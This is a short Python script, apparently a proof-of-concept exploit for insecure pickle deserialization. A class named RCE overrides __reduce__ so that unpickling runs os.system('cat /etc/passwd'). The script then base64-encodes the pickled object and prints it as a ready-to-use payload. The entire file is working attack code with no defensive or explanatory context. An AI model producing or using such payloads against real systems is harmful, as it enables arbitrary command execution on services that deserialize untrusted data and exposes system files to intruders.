import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload)
print(encoded.decode())

